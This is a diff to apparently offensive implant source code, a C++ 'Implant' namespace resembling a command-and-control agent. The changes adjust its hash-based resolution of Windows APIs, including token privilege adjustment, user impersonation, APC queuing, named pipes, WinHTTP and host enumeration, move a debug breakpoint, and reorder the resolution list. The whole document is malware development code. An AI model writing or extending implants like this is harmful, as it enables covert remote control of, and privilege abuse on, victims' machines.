@@ -41,7 +41,6 @@ namespace Implant {
     }
 
     VOID ReadConfig() {
-        __debugbreak();
         HEXANE
 
         _parser parser = { };
@@ -69,6 +68,7 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
+        __debugbreak();
         if (
             !F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY) ||
             !F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST) ||
@@ -86,7 +86,6 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.Module32Next,                    Ctx->modules.kernel32, MODULE32NEXT) ||
             !F_PTR_HMOD(Ctx->win32.GetCurrentProcessId,             Ctx->modules.kernel32, GETCURRENTPROCESSID) ||
             !F_PTR_HMOD(Ctx->win32.GetProcessId,                    Ctx->modules.kernel32, GETPROCESSID) ||
-            !F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.kernel32, IMPERSONATELOGGEDONUSER) ||
             !F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.kernel32, ADJUSTTOKENPRIVILEGES) ||
             !F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,            Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX) ||
             !F_PTR_HMOD(Ctx->win32.GetComputerNameExA,              Ctx->modules.kernel32, GETCOMPUTERNAMEEXA) ||
@@ -116,6 +115,19 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.QueueUserAPC,                    Ctx->modules.kernel32, QUEUEUSERAPC) ||
             !F_PTR_HMOD(Ctx->win32.GetThreadLocale,                 Ctx->modules.kernel32, GETTHREADLOCALE) ||
             !F_PTR_HMOD(Ctx->win32.SleepEx,                         Ctx->modules.kernel32, SLEEPEX) ||
+            !F_PTR_HMOD(Ctx->win32.FindResourceA,                   Ctx->modules.kernel32, FINDRESOURCEA) ||
+            !F_PTR_HMOD(Ctx->win32.LoadResource,                    Ctx->modules.kernel32, LOADRESOURCE) ||
+            !F_PTR_HMOD(Ctx->win32.LockResource,                    Ctx->modules.kernel32, LOCKRESOURCE) ||
+            !F_PTR_HMOD(Ctx->win32.SizeofResource,                  Ctx->modules.kernel32, SIZEOFRESOURCE) ||
+            !F_PTR_HMOD(Ctx->win32.FreeResource,                    Ctx->modules.kernel32, FREERESOURCE) ||
+            !F_PTR_HMOD(Ctx->win32.CallNamedPipeW,                  Ctx->modules.kernel32, CALLNAMEDPIPEW) ||
+            !F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,                Ctx->modules.kernel32, CREATENAMEDPIPEW) ||
+            !F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,                  Ctx->modules.kernel32, WAITNAMEDPIPEW) ||
+            !F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,         Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE) ||
+            !F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,                Ctx->modules.kernel32, CONNECTNAMEDPIPE) ||
+            !F_PTR_HMOD(Ctx->win32.TransactNamedPipe,               Ctx->modules.kernel32, TRANSACTNAMEDPIPE) ||
+            !F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,             Ctx->modules.kernel32, DISCONNECTNAMEDPIPE) ||
+            !F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                   Ctx->modules.kernel32, PEEKNAMEDPIPE) ||
             !F_PTR_HMOD(Ctx->win32.WinHttpOpen,                     Ctx->modules.winhttp, WINHTTPOPEN) ||
             !F_PTR_HMOD(Ctx->win32.WinHttpConnect,                  Ctx->modules.winhttp, WINHTTPCONNECT) ||
             !F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,              Ctx->modules.winhttp, WINHTTPOPENREQUEST) ||
@@ -132,19 +144,7 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,                 Ctx->modules.iphlpapi, GETADAPTERSINFO) ||
             !F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,            Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA) ||
             !F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,            Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA) ||
-            !F_PTR_HMOD(Ctx->win32.FindResourceA,                   Ctx->modules.kernel32, FINDRESOURCEA) ||
-            !F_PTR_HMOD(Ctx->win32.LoadResource,                    Ctx->modules.kernel32, LOADRESOURCE) ||
-            !F_PTR_HMOD(Ctx->win32.LockResource,                    Ctx->modules.kernel32, LOCKRESOURCE) ||
-            !F_PTR_HMOD(Ctx->win32.SizeofResource,                  Ctx->modules.kernel32, SIZEOFRESOURCE) ||
-            !F_PTR_HMOD(Ctx->win32.FreeResource,                    Ctx->modules.kernel32, FREERESOURCE) ||
-            !F_PTR_HMOD(Ctx->win32.CallNamedPipeW,                  Ctx->modules.kernel32, CALLNAMEDPIPEW) ||
-            !F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,                Ctx->modules.kernel32, CREATENAMEDPIPEW) ||
-            !F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,                  Ctx->modules.kernel32, WAITNAMEDPIPEW) ||
-            !F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,         Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE) ||
-            !F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,                Ctx->modules.kernel32, CONNECTNAMEDPIPE) ||
-            !F_PTR_HMOD(Ctx->win32.TransactNamedPipe,               Ctx->modules.kernel32, TRANSACTNAMEDPIPE) ||
-            !F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,             Ctx->modules.kernel32, DISCONNECTNAMEDPIPE) ||
-            !F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                   Ctx->modules.kernel32, PEEKNAMEDPIPE) ||
+            !F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.advapi, IMPERSONATELOGGEDONUSER) ||
             !F_PTR_HMOD(Ctx->win32.GetUserNameA,                    Ctx->modules.advapi, GETUSERNAMEA) ||
             !F_PTR_HMOD(Ctx->win32.LookupAccountSidW,               Ctx->modules.advapi, LOOKUPACCOUNTSIDW) ||
             !F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,           Ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA) ||
